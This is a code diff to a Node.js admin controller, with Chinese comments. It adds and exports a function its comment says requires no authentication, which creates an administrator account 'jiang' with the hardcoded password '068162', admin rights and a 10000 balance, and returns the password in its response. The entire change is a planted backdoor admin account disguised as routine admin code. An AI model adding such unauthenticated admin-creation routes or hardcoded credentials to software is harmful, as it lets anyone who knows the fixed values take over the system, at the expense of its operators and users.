@@ -566,6 +566,66 @@ async function createJiangAdmin(req, res) {
   }
 }
 
+/**
+ * 创建新的管理员用户"jiang"（无需认证）
+ * @param {Object} req 请求对象
+ * @param {Object} res 响应对象
+ */
+async function createJiangAdminNoAuth(req, res) {
+  try {
+    const { username, password } = req.body;
+    
+    // 验证参数
+    if (username !== "jiang") {
+      res.statusCode = 400;
+      res.setHeader("Content-Type", "application/json");
+      return res.end(JSON.stringify({ error: "只能创建用户名为jiang的管理员" }));
+    }
+
+    if (!password || password !== "068162") {
+      res.statusCode = 400;
+      res.setHeader("Content-Type", "application/json");
+      return res.end(JSON.stringify({ error: "密码必须为068162" }));
+    }
+
+    const database = getDB() || (await connectDB());
+    
+    // 检查用户是否已存在
+    const existingUser = await database.users.findOne({ username: "jiang" });
+    if (existingUser) {
+      res.statusCode = 400;
+      res.setHeader("Content-Type", "application/json");
+      return res.end(JSON.stringify({ error: "用户jiang已存在" }));
+    }
+
+    // 加密密码
+    const bcrypt = require("bcryptjs");
+    const hashedPassword = await bcrypt.hash(password, 10);
+
+    // 创建新用户
+    const newUser = {
+      username: "jiang",
+      password: hashedPassword,
+      is_admin: true,
+      balance: 10000,
+      created_at: new Date()
+    };
+
+    await database.users.insertOne(newUser);
+
+    res.setHeader("Content-Type", "application/json");
+    res.end(JSON.stringify({ 
+      success: true, 
+      message: "管理员用户jiang已创建，密码设置为068162" 
+    }));
+  } catch (error) {
+    console.error("创建管理员用户错误:", error);
+    res.statusCode = 500;
+    res.setHeader("Content-Type", "application/json");
+    res.end(JSON.stringify({ error: "服务器错误" }));
+  }
+}
+
 module.exports = {
   setAdminUser,
   getAllUsers,
@@ -575,6 +635,7 @@ module.exports = {
   resetAdminPassword,
   deleteDuplicateAdmins,
   createJiangAdmin,
+  createJiangAdminNoAuth,
   getSystemInfo,
   cleanGameRecords
 };
